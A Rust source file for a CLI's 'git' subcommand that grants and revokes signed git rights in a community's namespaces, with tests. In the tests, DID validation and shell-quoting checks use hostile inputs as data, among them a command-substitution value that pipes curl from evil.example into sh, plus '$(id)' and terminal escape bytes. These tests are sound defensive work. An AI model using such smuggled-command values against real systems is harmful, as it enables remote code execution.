//! `cnm git …` — the community's git namespaces (`git-ns/*`).
//!
//! Two kinds of command, and the difference is who is authorized:
//!
//! - **Changes** (`namespace bind|unbind`, `grant`, `revoke`, `adopt`, `view`)
//!   are signed `git-ns/*` Trust Tasks, signed with this community profile's
//!   key and authorized by *that DID's git rights* in the VTC's records. A
//!   community administrator's role binds namespaces and nothing more: to
//!   grant, this DID must hold a right that carries the authority.
//! - **Listings** (`namespace list`, `repos`, `view --admin`) are the
//!   administrator's REST reads and authenticate with an admin session, like
//!   `cnm vetting`.
//!
//! A refusal is reported by its specification code with the fix, where there
//! is one — `git-ns:lastOwner` names the grant that makes the revoke possible.

use clap::{Subcommand, ValueEnum};
use serde_json::{Value, json};
use vta_cli_common::duration::parse_duration_secs;
use vta_cli_common::render::{BOLD, DIM, RESET, bin_name, is_json_output, print_json};
use vtc_client::git_ns::{specs, task_error};
use vtc_client::{HolderKey, VtcClient, VtcError};

use crate::auth;
use crate::vtc::{self as vtc_target, VtcTarget};

type CliResult<T = ()> = Result<T, Box<dyn std::error::Error>>;

/// `cnm git …`
#[derive(Subcommand)]
pub enum GitCommands {
    /// Namespaces: bind this community to a forge owner, end it, list them.
    Namespace {
        #[command(subcommand)]
        command: NamespaceCommands,
    },
    /// List the repositories the community records (admin session).
    Repos {
        /// Only this namespace (its identifier, from `namespace list`).
        #[arg(long)]
        namespace: Option<String>,
    },
    /// Grant a git right, signed as this profile's DID.
    Grant {
        /// Who receives the right.
        #[arg(long)]
        subject: String,
        #[arg(long, value_enum)]
        right: RightArg,
        /// Forge-qualified and lowercase: `github.com/acme` or
        /// `github.com/acme/widgets`.
        #[arg(long)]
        resource: String,
        /// Lapse after this long (`90d`, `12h`).
        #[arg(long)]
        expires_in: Option<String>,
        /// Why — shown to the resource's owners and admins, never published.
        #[arg(long)]
        reason: Option<String>,
    },
    /// Revoke a recorded git right, signed as this profile's DID.
    Revoke {
        #[arg(long)]
        subject: String,
        #[arg(long, value_enum)]
        right: RightArg,
        #[arg(long)]
        resource: String,
        #[arg(long)]
        reason: Option<String>,
    },
    /// Create a repository in a namespace, becoming its owner (needs
    /// `git.repo.create`). Where no bot can create it, prints the steps.
    Create {
        /// The namespace identifier (`namespace list`).
        #[arg(long)]
        namespace: String,
        /// The repository name, lowercase.
        name: String,
        #[arg(long, value_enum, default_value_t = VisibilityArg::Public)]
        visibility: VisibilityArg,
        /// Shown by the forge; do not put anything here you would not publish.
        #[arg(long)]
        description: Option<String>,
    },
    /// Hand this profile's ownership of a repository to someone else.
    Transfer {
        /// `github.com/acme/widgets`.
        resource: String,
        /// Who receives ownership.
        #[arg(long)]
        to: String,
    },
    /// Archive a repository: the forge makes it read-only and every
    /// commit-signing right on it is revoked. No task reverses it.
    Archive {
        /// `github.com/acme/widgets`.
        resource: String,
    },
    /// Bring an existing repository under governance and name its owners.
    Adopt {
        /// `github.com/acme/widgets`.
        resource: String,
        /// An owner's DID. Repeat for several; at least one.
        #[arg(long = "owner", required = true)]
        owners: Vec<String>,
    },
    /// Answer drift the bridge reported on a repository (`git-ns/drift/resolve`).
    Drift {
        #[command(subcommand)]
        command: DriftCommands,
    },
    /// Restore an admin to a headless namespace — one whose every
    /// `git.ns.admin` left or lapsed. Community administrators only, and only
    /// while the namespace is headless.
    Reseat {
        /// The namespace identifier (`namespace list`).
        namespace: String,
        /// The current member who receives `git.ns.admin`.
        #[arg(long)]
        subject: String,
        /// Why the namespace is headless and why this member. Recorded as the
        /// right's reason and shown to the namespace's repository owners.
        #[arg(long)]
        statement: String,
    },
    /// What this profile's DID may see (`git-ns/view`), with its linked forge
    /// accounts, or with `--admin` every record and reason (admin session).
    View {
        #[arg(long)]
        resource: Option<String>,
        #[arg(long)]
        admin: bool,
    },
}

#[derive(Subcommand)]
pub enum DriftCommands {
    /// Adopt a forge-side role as a right, or have the bridge revert a
    /// forge-side change. Read the item first with `git view --resource`.
    Resolve {
        /// `github.com/acme/widgets`.
        resource: String,
        #[arg(value_enum)]
        action: DriftAction,
        /// The item's type, as `git view` shows it.
        #[arg(long = "type", value_enum)]
        kind: DriftTypeArg,
        /// For a role item: the forge account's id (not its login).
        #[arg(long)]
        account_id: Option<String>,
        /// For a role item: the account's login, for display.
        #[arg(long)]
        account_login: Option<String>,
        /// The item's `observed` value as you read it. Required to adopt: it
        /// is refused if the forge now shows something else.
        #[arg(long)]
        observed: Option<String>,
        #[arg(long)]
        reason: Option<String>,
    },
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum DriftAction {
    Adopt,
    Revert,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum DriftTypeArg {
    #[value(name = "roleAdded")]
    RoleAdded,
    #[value(name = "roleRemoved")]
    RoleRemoved,
    #[value(name = "roleChanged")]
    RoleChanged,
    #[value(name = "requiredCheckMissing")]
    RequiredCheckMissing,
    #[value(name = "protectionWeakened")]
    ProtectionWeakened,
    #[value(name = "bootstrapMissing")]
    BootstrapMissing,
}

impl DriftTypeArg {
    fn as_str(self) -> &'static str {
        match self {
            DriftTypeArg::RoleAdded => "roleAdded",
            DriftTypeArg::RoleRemoved => "roleRemoved",
            DriftTypeArg::RoleChanged => "roleChanged",
            DriftTypeArg::RequiredCheckMissing => "requiredCheckMissing",
            DriftTypeArg::ProtectionWeakened => "protectionWeakened",
            DriftTypeArg::BootstrapMissing => "bootstrapMissing",
        }
    }

    fn is_role(self) -> bool {
        matches!(
            self,
            DriftTypeArg::RoleAdded | DriftTypeArg::RoleRemoved | DriftTypeArg::RoleChanged
        )
    }
}

/// The `git-ns/drift/resolve` payload for these arguments. The account's
/// forge is the repository's; `login` is display only and defaults to the id.
fn drift_payload(
    resource: &str,
    action: DriftAction,
    kind: DriftTypeArg,
    account_id: Option<String>,
    account_login: Option<String>,
    observed: Option<String>,
    reason: Option<String>,
) -> CliResult<Value> {
    let resource = resource.to_lowercase();
    let mut drift = json!({ "type": kind.as_str() });
    match (kind.is_role(), account_id) {
        (true, Some(id)) => {
            let forge = resource.split('/').next().unwrap_or_default().to_string();
            let login = account_login.unwrap_or_else(|| id.clone());
            drift["account"] = json!({ "forge": forge, "id": id, "login": login });
        }
        (true, None) => {
            return Err(format!(
                "a `{}` item is selected by its account: pass --account-id",
                kind.as_str()
            )
            .into());
        }
        (false, Some(_)) => {
            return Err(format!("a `{}` item has no account", kind.as_str()).into());
        }
        (false, None) => {}
    }
    let action = match action {
        DriftAction::Adopt => "adopt",
        DriftAction::Revert => "revert",
    };
    if let Some(o) = observed {
        drift["observed"] = json!(o);
    } else if action == "adopt" {
        return Err("adopting records a right derived from the observed role: pass --observed                     with the value `git view` showed"
            .into());
    }
    let mut payload = json!({ "resource": resource, "drift": drift, "action": action });
    if let Some(r) = reason {
        payload["reason"] = json!(r);
    }
    Ok(payload)
}

#[derive(Subcommand)]
pub enum NamespaceCommands {
    /// Bind the community to one owner on one forge. Everything granted in it
    /// is published to the community's Trust Registry, where anyone can read
    /// who owns and who may commit to each repository.
    Bind {
        /// The forge host: `github.com`, `codeberg.org`, a GHES or Forgejo host.
        #[arg(long)]
        forge: String,
        /// The organisation or account, lowercase.
        #[arg(long)]
        owner: String,
        #[arg(long, value_enum, default_value_t = ModeArg::Manual)]
        mode: ModeArg,
    },
    /// End the community's governance of a namespace: every right in it is
    /// revoked and withdrawn from the registry.
    Unbind {
        /// The namespace identifier (`namespace list`).
        namespace: String,
    },
    /// List bound and pending namespaces (admin session).
    List,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum VisibilityArg {
    Public,
    Private,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum ModeArg {
    Bridge,
    Manual,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
pub enum RightArg {
    #[value(name = "git.ns.admin")]
    NsAdmin,
    #[value(name = "git.repo.create")]
    RepoCreate,
    #[value(name = "git.repo.own")]
    RepoOwn,
    #[value(name = "git.repo.maintain")]
    RepoMaintain,
    #[value(name = "git.commit.sign")]
    CommitSign,
}

impl RightArg {
    fn as_str(self) -> &'static str {
        match self {
            RightArg::NsAdmin => "git.ns.admin",
            RightArg::RepoCreate => "git.repo.create",
            RightArg::RepoOwn => "git.repo.own",
            RightArg::RepoMaintain => "git.repo.maintain",
            RightArg::CommitSign => "git.commit.sign",
        }
    }
}

/// This profile's key, as the signer of `git-ns/*` documents.
fn signing_key(keyring_key: &str) -> CliResult<(String, HolderKey)> {
    let session = auth::loaded_session(keyring_key).ok_or_else(|| {
        format!(
            "no stored identity for this community profile. Run `{} setup` first.",
            bin_name()
        )
    })?;
    let key = HolderKey::from_did_key(&session.client_did, &session.private_key_multibase)
        .map_err(|e| format!("this profile's key cannot sign: {e}"))?;
    Ok((session.client_did, key))
}

/// The fix for a refusal, where the operator's intent maps onto another
/// command.
/// A DID argument, checked as DID-core has it before anything is signed:
/// what the VTC would refuse, and what could not be pasted safely, is caught
/// here with the reason.
fn did_arg(label: &str, value: &str) -> CliResult<String> {
    vta_sdk::identifier::validate_did_core(label, value)?;
    Ok(value.to_string())
}

/// `s` as one POSIX shell word: unchanged when it holds nothing a shell
/// interprets, otherwise single-quoted. Every value this module puts into a
/// command it prints goes through here, so a printed command can be pasted
/// as it stands.
fn shell_word(s: &str) -> String {
    let plain = !s.is_empty()
        && s.bytes().all(|b| {
            b.is_ascii_alphanumeric()
                || matches!(
                    b,
                    b'.' | b'_' | b'-' | b'/' | b':' | b'@' | b'%' | b'+' | b'=' | b','
                )
        });
    if plain {
        s.to_string()
    } else {
        format!("'{}'", s.replace('\'', "'\\''"))
    }
}

/// Text from elsewhere (the VTC's refusal message, a DID) made safe to print
/// to a terminal: control characters, escapes included, are shown as `?`.
fn terminal_safe(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_control() { '?' } else { c })
        .collect()
}

fn guidance(code: &str, message: &str, did: &str) -> String {
    let bin = shell_word(bin_name());
    let (message, did) = (terminal_safe(message), terminal_safe(did));
    let hint = match code {
        "git-ns:lastOwner" => format!(
            "\nA repository always keeps an owner. Name another first:\n  {bin} git grant \
             --subject <did> --right git.repo.own --resource <repository>\nthen revoke this one."
        ),
        "git-ns:lastAdmin" => format!(
            "\nA namespace always keeps an admin. Grant another first:\n  {bin} git grant \
             --subject <did> --right git.ns.admin --resource <namespace>"
        ),
        "permissionDenied" if message.contains("elevated_requires_admin") => format!(
            "\nUnder the default `[git_ns] elevated_requires_admin`, an owner cannot transfer, \
             resign ownership, archive or name a co-owner without a community administrator: \
             this VTC has no step-up it can ask a member for yet. Ask a community \
             administrator to run it, e.g.:\n  {bin} git grant --subject <did> --right \
             git.repo.own --resource <repository>"
        ),
        "git-ns:escalation" | "permissionDenied" => format!(
            "\nThese commands are authorized by {did}'s own git rights, not by an admin \
             session. See what it holds:\n  {bin} git view"
        ),
        "git-ns:namespaceNotBound" => "\nThe namespace's binding has not completed: finish \
             the step at the URL `namespace bind` printed, then retry."
            .to_string(),
        "git-ns/namespace/bind:alreadyBound" => {
            format!("\nIt is already bound, or binding. See:\n  {bin} git namespace list")
        }
        "git-ns/namespace/bind:noBridge" => "\nNo bridge serves that forge. Bind with \
             `--mode manual`, or configure `[git_ns.bridges]` on the VTC."
            .to_string(),
        "git-ns:unknownRepo" => format!(
            "\nThe VTC records no repository there. Bring it under governance first:\n  {bin} \
             git adopt <resource> --owner <did>"
        ),
        "git-ns/repo/transfer:notOwner" => format!(
            "\nA transfer hands over your own ownership record. A namespace admin names an \
             owner instead:\n  {bin} git grant --subject <did> --right git.repo.own --resource \
             <repository>"
        ),
        "git-ns/repo/create:nameTaken" => format!(
            "\nThe community already records a repository there. See it:\n  {bin} git view \
             --resource <resource>"
        ),
        "git-ns/right/revoke:notGranted" => "\nNothing to revoke: no live record matches. \
             Implied rights (an owner's commit right, an admin's ownership) are not records."
            .to_string(),
        "git-ns/drift/resolve:driftNotFound" => format!(
            "\nNo outstanding item matches — resolved already, or the forge changed since you \
             read it. Read it again:\n  {bin} git view --resource <repository>"
        ),
        "git-ns/drift/resolve:notAdoptable"
        | "git-ns/drift/resolve:accountNotLinked"
        | "git-ns/drift/resolve:noMatchingRight" => format!(
            "\nThis item records no right. Revert it instead:\n  {bin} git drift resolve \
             <repository> revert --type <type> [--account-id <id>]"
        ),
        "git-ns/drift/resolve:notRevertible" => "\nThe bridge cannot undo this change: one \
             that implements only git-ns/bridge/job 0.1 cannot take a role it does not manage \
             off a repository. Remove it on the forge, or upgrade the bridge."
            .to_string(),
        "git-ns/namespace/reseat:notHeadless" => format!(
            "\nThe namespace still has an admin; its admins grant git.ns.admin:\n  {bin} git \
             grant --subject <did> --right git.ns.admin --resource <namespace>"
        ),
        _ => String::new(),
    };
    format!("the community refused it ({code}): {message}{hint}")
}

fn explain(err: VtcError, did: &str) -> Box<dyn std::error::Error> {
    match task_error(&err) {
        Some((code, message)) => guidance(&code, &message, did).into(),
        None => err.to_string().into(),
    }
}

fn show<T: serde::Serialize>(value: &T) -> CliResult {
    if is_json_output() {
        print_json(value)?;
    } else {
        println!("{}", serde_json::to_string_pretty(value)?);
    }
    Ok(())
}

/// What binding a namespace makes public.
fn bind_notice(forge: &str, owner: &str) -> String {
    format!(
        "Rights granted in {forge}/{owner} will be published to the community's Trust \
         Registry: anyone can read who owns and who may commit to each repository."
    )
}

/// Write `notice`, and only then send. The specification requires the public
/// consequence of a bind be stated before the namespace is bound
/// (`git-ns/namespace/bind`, *Request*), and a manual-mode bind is bound by the
/// very request — so the notice cannot follow the response.
async fn announce_then<T>(
    out: &mut impl std::io::Write,
    notice: &str,
    send: impl std::future::Future<Output = T>,
) -> T {
    let _ = writeln!(out, "{DIM}{notice}{RESET}");
    send.await
}

pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) -> CliResult {
    // Signed commands need no session; listings do.
    let anon = || VtcClient::anonymous(&target.base, &target.did);
    match command {
        GitCommands::Namespace { command } => match command {
            NamespaceCommands::Bind { forge, owner, mode } => {
                let (did, key) = signing_key(keyring_key)?;
                let mode = match mode {
                    ModeArg::Bridge => "bridge",
                    ModeArg::Manual => "manual",
                };
                let (forge, owner) = (forge.to_lowercase(), owner.to_lowercase());
                let client = anon();
                let resp = announce_then(
                    &mut std::io::stderr(),
                    &bind_notice(&forge, &owner),
                    client.git_ns_bind(&forge, &owner, mode, &key),
                )
                .await
                .map_err(|e| explain(e, &did))?;
                let v = serde_json::to_value(&resp)?;
                if is_json_output() {
                    return Ok(print_json(&v)?);
                }
                println!(
                    "{BOLD}{}/{}{RESET} — {} ({})",
                    v["namespace"]["forge"].as_str().unwrap_or_default(),
                    v["namespace"]["owner"].as_str().unwrap_or_default(),
                    v["namespace"]["state"].as_str().unwrap_or_default(),
                    v["namespace"]["id"].as_str().unwrap_or_default(),
                );
                if let Some(url) = v.pointer("/next/url").and_then(Value::as_str) {
                    println!("Prove control of the owner on the forge to finish binding:\n  {url}");
                }
                Ok(())
            }
            NamespaceCommands::Unbind { namespace } => {
                let (did, key) = signing_key(keyring_key)?;
                let resp = anon()
                    .git_ns_unbind(&namespace, &key)
                    .await
                    .map_err(|e| explain(e, &did))?;
                show(&resp)
            }
            NamespaceCommands::List => {
                let vtc = vtc_target::connect(keyring_key, target).await?;
                let v = vtc.client.git_ns_namespaces().await?;
                if is_json_output() {
                    return Ok(print_json(&v)?);
                }
                for ns in v["namespaces"].as_array().into_iter().flatten() {
                    println!(
                        "{BOLD}{}{RESET}  {}  {} {}  admins: {}  repos: {}",
                        ns["resource"].as_str().unwrap_or_default(),
                        ns["id"].as_str().unwrap_or_default(),
                        ns["mode"].as_str().unwrap_or_default(),
                        ns["state"].as_str().unwrap_or_default(),
                        ns["admins"].as_array().map_or(0, Vec::len),
                        ns["repoCount"],
                    );
                }
                Ok(())
            }
        },
        GitCommands::Repos { namespace } => {
            let vtc = vtc_target::connect(keyring_key, target).await?;
            let v = vtc.client.git_ns_repos(namespace.as_deref()).await?;
            if is_json_output() {
                return Ok(print_json(&v)?);
            }
            for r in v["repos"].as_array().into_iter().flatten() {
                println!(
                    "{BOLD}{}{RESET}  {}  owners: {}  sync: {}",
                    r["resource"].as_str().unwrap_or_default(),
                    r["state"].as_str().unwrap_or_default(),
                    r["owners"].as_array().map_or(0, Vec::len),
                    r["syncState"].as_str().unwrap_or_default(),
                );
            }
            Ok(())
        }
        GitCommands::Grant {
            subject,
            right,
            resource,
            expires_in,
            reason,
        } => {
            let subject = did_arg("--subject", &subject)?;
            let (did, key) = signing_key(keyring_key)?;
            let mut payload = json!({
                "subject": subject,
                "right": right.as_str(),
                "resource": resource.to_lowercase(),
            });
            if let Some(d) = expires_in {
                let secs = parse_duration_secs(&d)?;
                let at = chrono::Utc::now() + chrono::Duration::seconds(secs as i64);
                payload["expiresAt"] = json!(at.to_rfc3339_opts(chrono::SecondsFormat::Secs, true));
            }
            if let Some(r) = reason {
                payload["reason"] = json!(r);
            }
            let payload: specs::right::grant::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that grant is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_grant(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Revoke {
            subject,
            right,
            resource,
            reason,
        } => {
            let subject = did_arg("--subject", &subject)?;
            let (did, key) = signing_key(keyring_key)?;
            let mut payload = json!({
                "subject": subject,
                "right": right.as_str(),
                "resource": resource.to_lowercase(),
            });
            if let Some(r) = reason {
                payload["reason"] = json!(r);
            }
            let payload: specs::right::revoke::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that revocation is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_revoke(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Create {
            namespace,
            name,
            visibility,
            description,
        } => {
            let (did, key) = signing_key(keyring_key)?;
            let mut payload = json!({
                "namespace": namespace,
                "name": name.to_lowercase(),
                "visibility": match visibility {
                    VisibilityArg::Public => "public",
                    VisibilityArg::Private => "private",
                },
            });
            if let Some(d) = description {
                payload["description"] = json!(d);
            }
            let payload: specs::repo::create::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that repository is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_create_repo(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            let v = serde_json::to_value(&resp)?;
            if is_json_output() {
                return Ok(print_json(&v)?);
            }
            println!(
                "{BOLD}{}{RESET} — {}",
                v["repo"]["resource"].as_str().unwrap_or_default(),
                v["repo"]["state"].as_str().unwrap_or_default()
            );
            for (i, step) in v["manualSteps"]
                .as_array()
                .into_iter()
                .flatten()
                .enumerate()
            {
                println!("  {}. {}", i + 1, step.as_str().unwrap_or_default());
            }
            Ok(())
        }
        GitCommands::Transfer { resource, to } => {
            let to = did_arg("--to", &to)?;
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_transfer(&resource.to_lowercase(), &to, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Archive { resource } => {
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_archive(&resource.to_lowercase(), &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Adopt { resource, owners } => {
            for o in &owners {
                did_arg("--owner", o)?;
            }
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_adopt(&resource.to_lowercase(), &owners, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::View { resource, admin } => {
            if admin {
                let vtc = vtc_target::connect(keyring_key, target).await?;
                let v = vtc.client.git_ns_admin_view(resource.as_deref()).await?;
                return show(&v);
            }
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_view_v2(resource.as_deref(), &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Drift {
            command:
                DriftCommands::Resolve {
                    resource,
                    action,
                    kind,
                    account_id,
                    account_login,
                    observed,
                    reason,
                },
        } => {
            let (did, key) = signing_key(keyring_key)?;
            let payload = drift_payload(
                &resource,
                action,
                kind,
                account_id,
                account_login,
                observed,
                reason,
            )?;
            let payload: specs::drift::resolve::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that resolution is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_drift_resolve(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Reseat {
            namespace,
            subject,
            statement,
        } => {
            let subject = did_arg("--subject", &subject)?;
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_reseat(&namespace, &subject, &statement, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_elevated_refusal_says_a_community_administrator_is_needed() {
        let g = guidance(
            "permissionDenied",
            "repo.transfer is a elevated action … (`[git_ns] elevated_requires_admin`)",
            "did:key:z",
        );
        assert!(g.contains("without a community administrator"), "{g}");
    }

    #[tokio::test]
    async fn the_bind_notice_is_written_before_the_request_is_sent() {
        use std::sync::atomic::{AtomicBool, Ordering};
        struct Probe<'a> {
            sent: &'a AtomicBool,
            text: Vec<u8>,
        }
        impl std::io::Write for Probe<'_> {
            fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
                assert!(
                    !self.sent.load(Ordering::SeqCst),
                    "the notice came after the request"
                );
                self.text.extend_from_slice(buf);
                Ok(buf.len())
            }
            fn flush(&mut self) -> std::io::Result<()> {
                Ok(())
            }
        }
        let sent = AtomicBool::new(false);
        let mut out = Probe {
            sent: &sent,
            text: Vec::new(),
        };
        announce_then(&mut out, &bind_notice("github.com", "acme"), async {
            sent.store(true, Ordering::SeqCst)
        })
        .await;
        assert!(sent.load(Ordering::SeqCst));
        let text = String::from_utf8(out.text).unwrap();
        assert!(text.contains("github.com/acme will be published"), "{text}");
    }

    #[test]
    fn a_last_owner_refusal_names_the_grant_that_resolves_it() {
        let g = guidance("git-ns:lastOwner", "last owner", "did:key:z");
        assert!(g.contains("--right git.repo.own"), "{g}");
    }

    #[test]
    fn drift_resolve_arguments_become_the_specifications_selector() {
        let p = drift_payload(
            "GitHub.com/Acme/Widgets",
            DriftAction::Revert,
            DriftTypeArg::RoleAdded,
            Some("5550123".into()),
            Some("eve-dev".into()),
            Some("write".into()),
            None,
        )
        .unwrap();
        assert_eq!(
            p,
            json!({
                "resource": "github.com/acme/widgets",
                "action": "revert",
                "drift": {
                    "type": "roleAdded",
                    "account": { "forge": "github.com", "id": "5550123", "login": "eve-dev" },
                    "observed": "write"
                }
            })
        );
        let _: specs::drift::resolve::v0_1::Payload = serde_json::from_value(p).unwrap();
        // A role item needs its account; a protection item has none; adopt
        // needs what was observed.
        assert!(
            drift_payload(
                "github.com/a/b",
                DriftAction::Revert,
                DriftTypeArg::RoleAdded,
                None,
                None,
                None,
                None
            )
            .is_err()
        );
        assert!(
            drift_payload(
                "github.com/a/b",
                DriftAction::Revert,
                DriftTypeArg::BootstrapMissing,
                Some("1".into()),
                None,
                None,
                None
            )
            .is_err()
        );
        assert!(
            drift_payload(
                "github.com/a/b",
                DriftAction::Adopt,
                DriftTypeArg::RoleChanged,
                Some("1".into()),
                None,
                None,
                None
            )
            .is_err()
        );
    }

    #[test]
    fn a_not_revertible_refusal_explains_the_bridge_version() {
        let g = guidance("git-ns/drift/resolve:notRevertible", "refused", "did:key:z");
        assert!(g.contains("bridge/job 0.1"), "{g}");
    }

    #[test]
    fn a_did_argument_that_is_not_did_core_is_refused_before_signing() {
        for bad in [
            "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
            "did:web:x;id",
            "did:web:x y",
            "did:web:x#k-1",
        ] {
            assert!(did_arg("--subject", bad).is_err(), "{bad}");
        }
        assert!(did_arg("--subject", "did:webvh:QmScid:acme-vtc.example:bob").is_ok());
    }

    #[test]
    fn printed_commands_quote_what_a_shell_would_interpret() {
        assert_eq!(shell_word("cnm"), "cnm");
        assert_eq!(
            shell_word("did:webvh:QmScid:acme.example"),
            "did:webvh:QmScid:acme.example"
        );
        assert_eq!(shell_word("a b"), "'a b'");
        assert_eq!(shell_word("$(id)"), "'$(id)'");
        assert_eq!(shell_word("it's"), "'it'\\''s'");
        assert_eq!(shell_word(""), "''");
        // A refusal's text reaches the terminal without its control bytes.
        let g = guidance("git-ns:lastOwner", "evil\u{1b}[2Jmsg", "did:key:z\u{7}");
        assert!(!g.chars().any(|c| c.is_control() && c != '\n'), "{g:?}");
    }

    #[test]
    fn right_arguments_carry_the_wire_spelling() {
        assert_eq!(RightArg::CommitSign.as_str(), "git.commit.sign");
        assert_eq!(RightArg::NsAdmin.as_str(), "git.ns.admin");
    }
}
